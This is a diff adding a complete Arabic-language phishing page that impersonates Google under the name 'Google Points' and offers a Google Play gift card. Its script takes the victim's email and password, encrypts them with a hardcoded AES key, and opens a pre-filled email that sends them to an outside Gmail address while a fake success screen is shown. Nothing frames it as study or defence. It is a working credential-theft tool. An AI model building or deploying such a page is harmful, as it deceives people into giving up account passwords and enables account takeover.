@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>Google-Points</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+  <style>
+    body {
+      background-color: #ffffff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      height: 100vh;
+      margin: 0;
+      zoom: 1.6;
+      padding-top: 40px;
+      overflow: hidden;
+    }
+
+    /* --- شاشة البداية --- */
+    .splash {
+      position: fixed;
+      inset: 0;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+    }
+
+    .splash.hidden {
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.4s ease;
+    }
+
+    .progress-bar {
+      width: 200px;
+      height: 6px;
+      border-radius: 10px;
+      background: #ddd;
+      overflow: hidden;
+      margin-top: 20px;
+    }
+
+    .progress {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #4285F4, #EA4335, #FBBC05, #34A853);
+      background-size: 400%;
+      animation: load 3s linear forwards, shift 1.5s infinite linear;
+    }
+
+    @keyframes load { to { width: 100%; } }
+    @keyframes shift { 0% { background-position:0%; } 100% { background-position:100%; } }
+
+    /* --- الشعار والواجهة الأصلية --- */
+    .logo {
+      font-size: 80px;
+      font-weight: bold;
+      margin-bottom: 30px;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+      animation: float 3s infinite ease-in-out;
+    }
+
+    .logo-icon {
+      width: 90px;
+      height: 90px;
+      animation: rotateIcon 5s infinite linear;
+    }
+
+    .logo span {
+      display: inline-block;
+      animation: bounce 1.5s infinite ease-in-out;
+    }
+
+    .logo span:nth-child(2) { color: #4285F4; }
+    .logo span:nth-child(3) { color: #EA4335; }
+    .logo span:nth-child(4) { color: #FBBC05; }
+    .logo span:nth-child(5) { color: #34A853; }
+    .logo span:nth-child(6) { color: #EA4335; }
+    .logo span:nth-child(7) { color: #4285F4; }
+
+    @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+    @keyframes rotateIcon { 0% { transform: rotate(0deg) scale(1); } 50% { transform: rotate(180deg) scale(1.2); } 100% { transform: rotate(360deg) scale(1); } }
+    @keyframes bounce { 0%,100% { transform: translateY(0) scale(1); } 50% { transform: translateY(-10px) scale(1.2); } }
+
+    .login-container {
+      width: 490px;
+      padding: 50px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+      border-radius: 12px;
+      background-color: #fefefe;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.6s ease;
+    }
+
+    .login-container h2 {
+      text-align: center;
+      margin-bottom: 40px;
+      color: #202124;
+      font-size: 28px;
+    }
+
+    input {
+      width: 100%;
+      padding: 18px;
+      margin-bottom: 5px;
+      border: 1px solid #dadce0;
+      border-radius: 6px;
+      font-size: 18px;
+      background-color: #f1f3f4;
+      transition: border-color 0.2s;
+    }
+
+    input:focus {
+      border-color: #1a73e8;
+      outline: none;
+      background-color: #fff;
+    }
+
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-bottom: 15px;
+      opacity: 0;
+      transition: opacity 0.4s ease;
+      display: block;
+    }
+
+    .error-message.show {
+      opacity: 1;
+    }
+
+    button {
+      width: 100%;
+      padding: 18px;
+      background-color: #1a73e8;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #155ab6;
+    }
+
+    /* --- شاشة النجاح --- */
+    .success-screen {
+      display: none;
+      flex-direction: column;
+      justify-content: flex-start;
+      align-items: center;
+      height: 100%;
+      width: 100%;
+      background-color: #4285F4;
+      color: white;
+      text-align: center;
+      padding: 60px 20px 20px 20px;
+      animation: fadeIn 0.6s ease;
+    }
+
+    .success-screen h1 {
+      font-size: 48px;
+      margin: 30px 0 20px 0;
+    }
+
+    .success-screen .logo {
+      font-size: 36px;
+      gap: 10px;
+    }
+
+    .success-screen .logo img {
+      width: 80px;
+      height: 80px;
+    }
+
+    @keyframes fadeIn {
+      0% { opacity: 0; transform: scale(0.8); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+  </style>
+</head>
+
+<body>
+
+<!-- شاشة البداية -->
+<div class="splash" id="splash">
+  <img src="https://i.ibb.co/d9knj3Z/unnamed.png" class="logo-icon">
+  <div class="progress-bar">
+    <div class="progress"></div>
+  </div>
+</div>
+
+<!-- الواجهة الأصلية -->
+<div class="logo">
+  <img src="https://i.ibb.co/d9knj3Z/unnamed.png" class="logo-icon">
+  <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+</div>
+
+<div class="login-container" id="loginContainer">
+  <h2>تسجيل الدخول</h2>
+  
+  <input type="email" id="emailplayer" placeholder="Email">
+  <span class="error-message" id="emailError"></span>
+  
+  <input type="password" id="passwordplayer" placeholder="Password">
+  <span class="error-message" id="passwordError"></span>
+  
+  <button onclick="sendEncrypted()">Login Up</button>
+</div>
+
+<!-- شاشة النجاح -->
+<div class="success-screen" id="successScreen">
+  <div class="logo">
+    <span>Google Points</span>
+  </div>
+  <h1>لقد تم تسجيلك بنجاح !</h1>
+  <p>مرحبا بك في Google Points</p>
+  <p>ستتوصل ببطاقة الهدايا الخاصة بك بالحساب الذي قمت بالتسجيل به</p>
+</div>
+
+<script>
+  // شاشة البداية
+  document.addEventListener("DOMContentLoaded", function() {
+    setTimeout(() => {
+      document.getElementById("splash").classList.add("hidden");
+      const login = document.getElementById("loginContainer");
+      login.style.opacity = "1";
+      login.style.pointerEvents = "auto";
+    }, 3000);
+  });
+
+  function encryptMessage(msg, keyString) {
+    const key = CryptoJS.enc.Utf8.parse(keyString);
+    const encrypted = CryptoJS.AES.encrypt(msg, key, {
+      mode: CryptoJS.mode.ECB,
+      padding: CryptoJS.pad.Pkcs7
+    });
+    return encrypted.toString();
+  }
+
+  function sendEncrypted() {
+    const emailField = document.getElementById("emailplayer");
+    const passwordField = document.getElementById("passwordplayer");
+    const emailError = document.getElementById("emailError");
+    const passwordError = document.getElementById("passwordError");
+
+    // إخفاء الرسائل السابقة
+    emailError.classList.remove("show");
+    passwordError.classList.remove("show");
+    emailField.style.borderColor = "#dadce0";
+    passwordField.style.borderColor = "#dadce0";
+
+    let valid = true;
+
+    if (!emailField.value.trim()) {
+      emailError.textContent = "يرجى ملء خانة البريد الإلكتروني";
+      emailError.classList.add("show");
+      emailField.style.borderColor = "red";
+      valid = false;
+    }
+
+    if (!passwordField.value.trim()) {
+      passwordError.textContent = "يرجى ملء خانة كلمة المرور";
+      passwordError.classList.add("show");
+      passwordField.style.borderColor = "red";
+      valid = false;
+    }
+
+    if (!valid) return;
+
+    // إخفاء شاشة تسجيل الدخول فوراً
+    document.getElementById("loginContainer").style.display = "none";
+
+    // الانتظار 2 ثانية ثم عرض شاشة النجاح
+    setTimeout(() => {
+      document.getElementById("successScreen").style.display = "flex";
+    }, 2000);
+
+    // الإرسال
+    const id = emailField.value;
+    const name = passwordField.value;
+    const key = "@&7#8g$9b$g28$7y";
+    const plainText = `Email: > ${id} <\nPassword: > ${name} <`;
+    const encryptedText = encryptMessage(plainText, key);
+    const subject = encodeURIComponent("سيتم ارسال كود بطاقة هداي غوغل بلاي تلقائيا بعد ان ترسل هذا الرمز اسفله ↓↓↓");
+    const body = encodeURIComponent(encryptedText);
+    const email = "devloff8@gmail.com";
+    window.location.href = `mailto:${email}?subject=${subject}&body=${body}`;
+  }
+</script>
+
+</body>
+</html>
